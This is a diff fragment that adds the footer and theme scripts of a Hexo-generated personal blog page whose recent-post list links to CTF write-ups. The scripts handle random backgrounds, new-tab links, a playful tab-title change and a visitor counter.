class="post-list-link" href="/2022/01/23/kernel-1-basic_knowledge/">kernel-1-basic_knowledge</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/22/Drangonctf2021-noflippidy/">Drangonctf2021-noflippidy</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/01/21/dicectf2021-flippidy/">dicectf2021_flippidy</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2022-2023 nich0las
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 1;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
